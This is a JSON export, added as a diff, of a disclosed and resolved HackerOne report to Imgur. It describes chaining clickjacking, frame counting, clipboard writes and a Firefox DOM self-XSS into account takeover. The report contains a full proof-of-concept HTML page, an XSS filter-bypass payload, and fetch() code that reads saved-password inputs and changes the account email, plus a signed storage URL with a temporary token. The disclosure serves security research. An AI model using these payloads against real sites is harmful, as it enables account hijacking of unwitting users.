@@ -1,0 +1,421 @@
+{
+  "id": 892289,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTIyODk=",
+  "url": "https://hackerone.com/reports/892289",
+  "title": "self-xss with ClickJacking can leads to account takeover in Firefox",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-06-05T17:27:12.724Z",
+  "submitted_at": "2020-06-05T17:27:12.724Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "keer0k",
+    "url": "/keer0k",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 638,
+    "url": "https://hackerone.com/imgur",
+    "handle": "imgur",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Imgur",
+      "twitter_handle": "imgur",
+      "website": "http://imgur.com",
+      "about": "The most awesome images on the Internet."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-17T19:23:26.587Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-18T19:23:19.540Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Description\n\n\nHi, i think i found a valid chaining issues here\n\n## ClickJacking issue\n\nI discovered that have some endpoints that permits to frame imgur.com with some limitations, but even in this case, it is possible to carry out a proof of concept.\n\nOne of the cases is in the `/all/` directory of `user.imgur.com`, but in these cases we would be able to make the vulnerability only for a specific user and we would need to fix his subdomain.\n\nThe other case is when we enter the embed page of an image, such as `/a/IMAGE_ID/embed`, when we request a page like this, we are usually given the following result:\n\n\nHowever, by adding a `/embed` it is possible to open the imgur.com page where the image is located next to the full post, this allows us to access the main domain menu without being blocked by`X-Frame-Options`.\n\nI'm not sure how `X-Frame-Options` is really acting on this web app, but I'm sure it shouldn't be allowed!\n\nex:\n\n```\n<iframe src=http://imgur.com/a/lz8DAkB/embed/embed?pub=true&ref=http%3A%2F%2Flocalhost%2Fembed.html&w=540></iframe>\n```\n\n## DOM-Based Self-XSS \nThere is a self-xss specifically when uploading an image in the beta version of the upload, it is available using Firefox (I couldn't find it in Chrome or Safari) I don't know exactly where XSS happens, but I managed to bypass his rule with the following payload:\n\n`<<!<script>iframe src=javajavascriptscript:alert(document.domain)>`\n\n\n\n## frame counting\n\nI realized that there is a big difference in frames on some pages, especially on the upload? Beta page in relation to the others, because on most other pages we have at least more than 3 frames, while on the upload? Beta page we have only 1 frame, and this helped me because I was able to detect the movement I wanted inside an iframe.\n\nWith that, when we are framing `/ a / IMAGE_ID / embed / embed` I know that there is more than one frame on the page, and when I click to enter the upload? Beta, the iframe will have only one frame inside so I get to know which page the user is on.\n\nex:\n\n```\n<iframe id=ifr></iframe>\n<script>\nifr.onload=function(){\n    console.log(ifr.contentWindow.frames.length);\n}\n</script>\n```\n\n## clipboard trick\n\nI used the `navigator.clipboard.writeText()` API so that I can write a text on the victim's clipboard, making this text the Self-XSS payload.\n\nHowever, the user needs to allow the use of the clipboard API on the page, to allow this use, a message will appear in the top corner of the browser, asking if you allow it or not, of course in this case, we are thinking of a scenario where the user allows this utility.\n\nex:\n\n```\n<script>\nsetInterval(function(){\n    \n    navigator.clipboard.writeText(\"PAYLOAD\").then(function(text){console.log(text)});\n\n},1000)\n</script>\n```\n\n\n## saved passwords in firefox\n\nThere is the possibility that the user has saved the password in the browser, and when that happens, in firefox the password is recorded in the input, so in this case it is possible to make an account takeover in the imgur account. On the other hand, when it doesn't, it is still possible to do XSS.\n\n\n# PoC code\n\n```\n<!DOCTYPE html>\n<html lang=\"en\" dir=\"ltr\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>PoC</title>\n    <style media=\"screen\">\n      iframe{\n        opacity: 50%;\n        width: 1000px;\n        height: 500px;\n\n      }\n      #content{\n        position: relative;\n      }\n      #btn1{\n        position:absolute;\n        top: 30px;\n        left: 170px;\n        vertical-align: middle;\n        padding: 0px;\n        background-color: #7a297a;\n        color:white;\n        border: 2px solid #7a297a;\n        border-radius: 25px;\n        font-size: 20px;\n      }\n      #btn2{\n        position:absolute;\n        top: 120px;\n        left: 170px;\n        vertical-align: middle;\n        padding: 0px;\n        background-color: #7a297a;\n        color:white;\n        border: 2px solid #7a297a;\n        border-radius: 25px;\n        font-size: 20px;\n      }\n    </style>\n  </head>\n  <body>\n\n      <div id=\"btn1\">Click Here</div>\n    <div id=content>\n      <div id=\"btn2\">\n\n      </div>\n    <blockquote id=\"block\" class=\"imgur-embed-pub\" lang=\"en\" data-id=\"a/lz8DAkB/embed\">\n      <a href=\"//imgur.com/a/xx\">Life is not the same without your loved ones ...</a>\n    </blockquote>\n\n      </div>\n    <br><br>\n    <p style=\"color: red\">copy this text</p>\n\n    <input type=\"text\" name=\"\" value=\"https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>\">\n    <img src=boa.jpeg>\n    <script async src=\"//s.imgur.com/min/embed.js\" charset=\"utf-8\"></script>\n    <script type=\"text/javascript\">\n    var i = 0;\n    var j = 0;\n    var ifr = '';\n    var x = 0;\n    setTimeout(function(){\n      ifr = document.querySelector('iframe');\n      ifr.style=\"\";\n      ifr.removeAttribute(\"sandbox\");\n      console.log(ifr);\n    },4000)\n\n    setInterval(function(){\n      navigator.clipboard.writeText(\"<<!<script>iframe src=javajavascriptscript:alert(document.domain)>\").then(function(text){console.log(text)})\n    },1000)\n    setInterval(function(){\n      if(i==2){\n        console.log(\"stop counter...\");\n      }\n      if(x!=1){\n        if(ifr.contentWindow.frames.length==1){\n          console.log(\"page change!\");\n          btn1.innerHTML=\"drag the image to here!\";\n          x=1;\n        }\n      }\n\n    },1000)\n\n      onmessage=function(event){\n        console.log(event);\n        i++;\n      }\n\n      onpaste=function(){\n        console.log(\"ONPASTE!\");\n      }\n\n      ondragend=function(){\n\n        btn1.innerHTML=\"\";\n        setTimeout(function(){\n          btn1.innerHTML=\"\";\n\n          btn2.innerHTML=\"copy the red text and paste here after that, press enter!\";\n        },1100)\n      }\n\n    </script>\n  </body>\n</html>\n```\n\nVideo:  \n{F856533}\n\nPara conseguir o account takeover usando esse XSS ainda é necessario abrir uma nova window com `window.open(\"https://imgur.com/account/settings/password\n\",\"_blank\")` e depois implementar o seguinte código para conseguir ler os dados presentes nos inputs:\n\n```\n  forms = ifr.contentDocument.getElementsByTagName(\"form\")[5];\n        inputs = forms.getElementsByTagName(\"input\");body = \"\";\n        for(var i =0; i < inputs.length; i++){\n          if(inputs[i].name==\"email\"){\n              inputs[i].value=\"keerok%40protonmail.com\";\n          }\n          body +=inputs[i].name+\"=\"+inputs[i].value+\"&\";\n        }\n        body += \"_jafo%5BactiveExperiments%5D=%5B%5D&_jafo%5BexperimentData%5D=%7B%7D\";\n\n        await fetch(\"https://imgur.com/account/settings/password\", {\n          \"credentials\": \"include\",\n          \"headers\": {\n              \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0\",\n              \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\",\n              \"Accept-Language\": \"pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\",\n              \"Content-Type\": \"application/x-www-form-urlencoded\",\n              \"Upgrade-Insecure-Requests\": \"1\"\n          },\n          \"referrer\": \"https://imgur.com/account/settings/password\",\n          \"body\": body,\n          \"method\": \"POST\",\n          \"mode\": \"cors\"\n        });\n```\n\n\nUsing the same clickjacking trick it is possible to get another xss with less user interaction, I will put this other method in the comments\n\n\n# Steps to reprocuce - whitout account takeover\n1. click in click here\n2. drag the image to the text \"drag image here\"\n3. copy the red text to \"paste here\"\n4. press enter or click in any other local of the page\n5. XSS will be triggered\n\n## Impact\n\nAccount takeover and the attacker can perform malicious action in the victim account",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 856533,
+      "file_name": "imgur_poc.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yBuBRhHXiVmQDadcoMMzJd4q?response-content-disposition=attachment%3B%20filename%3D%22imgur_poc.mov%22%3B%20filename%2A%3DUTF-8%27%27imgur_poc.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPXH7W2A%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072105Z&X-Amz-Expires=1263&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIHPD5gEySofUz1xOLbF9RxzsoYi23gDFF6VpbtbxOEbOAiB0gZ0PrWMj9ApM1upCkFsCGj2wZDr0sHM%2FdCN3TWiFlSqwBQgjEAMaDDAxMzYxOTI3NDg0OSIMFefSibaONAmXZdeqKo0FrStIIybrOK6bEwZr5pyK3JxTPHUorBb2V3hjVumlSUzrcUlJuskVWrmNd4RZL3xYp2NFjX6sZJlmfTosswJ6ixEgQRESjrdVab2HF45mm1trgD3HzrFdEa05QJxHMZHXuB0vxaGaUOTokNTEwFLItAjHN8%2FHLB9ycpatLFRq4uVN52spSmTZuDQndEo8CrKUsfA6BtwhxzLkkyZXne1e7M4CpAzxKNKcPiko1jpES02h%2Fmpk5SDR%2BRZgUwj065jAzDlJI%2FvKBvp8t7GbOQq5n5ZWH%2Bz25xRNvUE4i5RKXJizerdDmxAuRROSFAzpdj497%2Fu1CSvhiDHUA%2FVbn8aRwo5DUTNtQtdEeOAEEwiUDCqAgMd5lKuIYIFEIDBuOZNAgvte6VgIXN37ZrqXGK1lsZDS2Hv2bBBHglR9kA4uWBUlZddQ0fUlTAThnBO%2FkixEijGrsWLkkqt8dXMp%2FKYzi2wtDguJlqkw8pnHiViufOnyhy3mr5aLppahgdAOgCchFtV7W9lAV4PB4O0o4p2B9tFko0Jtrln3CsOFrrIzCFf%2BqS2LdxwMZ1jZR3buat3bHV7T5DKtUBs4MGMx6kIi%2FI8gpiY69A3lVRFCjHfWE12sqHEdq9rnG07syd1vglEXDaqqJe%2BYfYR5Ee8nKmckWCkLt0pEGiIA%2FRI%2Bs0ch6NccoW1IiW1uRJG2o64XI%2Bhv3%2Ff2Jg1XfOr%2FKnljk3KQypfib6Zo3eySEuL4cPDCbFIQ%2B4fpUtNBwB%2B6TbMKThow0d%2B9zURqcAZ6QSoDbaT9p04JVxFeOyWzLmH5zvIIt52C%2FVUHGoRrO3ELP6qYs0snGQH6%2FmKbyjnqEMAatXzXI2U9K25Q6ELBK1NGPV0wwYC5qAY6sgHvPFSU40Te8U3TvG0%2FxnZKpqRY7RwHe0EqI8E%2Ffn%2FbAzZtS1msTHhvGiqBntJ%2BccpQwaI%2F7uuwU5ZbJ0JKOVnnBIFFbA%2F2LUwsTSOccxF6VQyLkJQfo0TACBsb8BuejEQN1JySWmkU0BakfQo05LRh87A3TuiIhaxJJzE6m%2B%2BClcIezMNMH9ULosA4UY1PvvIIQAIFyFjboubORtGvP383QMi6o8GCABrtvUKoxEMaCYgZ&X-Amz-SignedHeaders=host&X-Amz-Signature=765c21fe37812c900f5e476e8db09db5d56671817e5d9edb485936818d6ee0ec",
+      "file_size": 18109788,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-17T19:23:19.579Z",
+  "allow_singular_disclosure_after": -89812666.13116999,
+  "singular_disclosure_allowed": true,
+  "vote_count": 14,
+  "voters": [
+    "keer0k",
+    "htrgouvea",
+    "0nlymohammed",
+    "its_afolic",
+    "aporlorxl23",
+    "sodium_",
+    "idiablos",
+    "yusuf_furkan",
+    "khizer47",
+    "shivammusic",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8216648,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi @keer0k,\nWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made.\n\nThanks!",
+      "automated_response": false,
+      "created_at": "2020-06-05T20:35:10.525Z",
+      "updated_at": "2020-06-05T20:35:10.525Z",
+      "actor": {
+        "username": "srinidhik",
+        "cleared": false,
+        "verified": false,
+        "url": "/srinidhik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/342/158/8d34a803d2f3fffe842a3047954bcf0007d73044_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 8237667,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "The Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!",
+      "automated_response": false,
+      "created_at": "2020-06-08T23:42:30.703Z",
+      "updated_at": "2020-06-08T23:42:30.703Z",
+      "actor": {
+        "url": "/imgur",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Imgur"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "imgur",
+      "collaborator": {
+        "username": "keer0k",
+        "url": "/keer0k"
+      }
+    },
+    {
+      "id": 8244508,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "When the fixe coming, we can do full disclosure of this report?",
+      "automated_response": false,
+      "created_at": "2020-06-09T15:41:55.019Z",
+      "updated_at": "2020-06-09T15:41:55.019Z",
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 8244511,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "And thanks for the bounty!",
+      "automated_response": false,
+      "created_at": "2020-06-09T15:42:14.996Z",
+      "updated_at": "2020-06-09T15:42:14.996Z",
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9548623,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "hi, it seems that isn't reproducible anymore, we can mark this as resolved?",
+      "automated_response": false,
+      "created_at": "2020-10-17T03:37:58.754Z",
+      "updated_at": "2020-10-17T03:37:58.754Z",
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9554544,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @keer0k,\nThanks for following up. Yes, this issue was fixed some time ago; apologies\nfor the delay. I will go ahead and mark this as **Resolved**.",
+      "automated_response": false,
+      "created_at": "2020-10-18T08:27:32.889Z",
+      "updated_at": "2020-10-18T08:27:32.889Z",
+      "actor": {
+        "username": "srinidhik",
+        "cleared": false,
+        "verified": false,
+        "url": "/srinidhik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/342/158/8d34a803d2f3fffe842a3047954bcf0007d73044_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "keer0k",
+        "url": "/keer0k"
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9557361,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-10-18T19:23:19.561Z",
+      "updated_at": "2020-10-18T19:23:19.561Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9663306,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "hi @srinidhik i just realise that have another endpoint vulnerable to the same attack,can I comment here the PoC or it's needed a new report? ",
+      "automated_response": false,
+      "created_at": "2020-10-28T19:17:01.589Z",
+      "updated_at": "2020-10-28T19:18:17.105Z",
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9666926,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@keer0k,\nThanks for following up. Since you mention the endpoint is different\nand this report has been marked as *Resolved* can you please open a\nseparate report?\n\nThanks.",
+      "automated_response": false,
+      "created_at": "2020-10-29T06:34:21.359Z",
+      "updated_at": "2020-10-29T06:34:21.359Z",
+      "actor": {
+        "username": "srinidhik",
+        "cleared": false,
+        "verified": false,
+        "url": "/srinidhik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/342/158/8d34a803d2f3fffe842a3047954bcf0007d73044_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9835714,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "hi @srinidhik , can you edit the report, exchange the\n\n```\nPara conseguir o account takeover usando esse XSS ainda é necessario abrir uma nova window com window.open(\"https://imgur.com/account/settings/password\n\",\"_blank\") e depois implementar o seguinte código para conseguir ler os dados presentes nos inputs:\n```\n\nto \n\n```\nTo get the account takeover using this XSS it is still necessary to open a new window with window.open (\"https://imgur.com/account/settings/password\n\",\" _ blank \") and then implement the following code to be able to read the data present in the inputs:\n```\n\nand not show the messages that come after?",
+      "automated_response": false,
+      "created_at": "2020-11-16T18:33:25.444Z",
+      "updated_at": "2020-11-16T18:33:25.444Z",
+      "actor": {
+        "username": "keer0k",
+        "cleared": true,
+        "verified": true,
+        "url": "/keer0k",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/xohmlejeqahxuzkbdriratk2ghke/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9840354,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @keer0k,\nI don't think the report body can be edited; AFAIK, only titles are editable.\n\nThanks.",
+      "automated_response": false,
+      "created_at": "2020-11-17T05:53:56.693Z",
+      "updated_at": "2020-11-17T05:53:56.693Z",
+      "actor": {
+        "username": "srinidhik",
+        "cleared": false,
+        "verified": false,
+        "url": "/srinidhik",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/342/158/8d34a803d2f3fffe842a3047954bcf0007d73044_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    },
+    {
+      "id": 9848088,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-11-17T19:23:26.637Z",
+      "updated_at": "2020-11-17T19:23:26.637Z",
+      "actor": {
+        "url": "/imgur",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Imgur"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "imgur"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
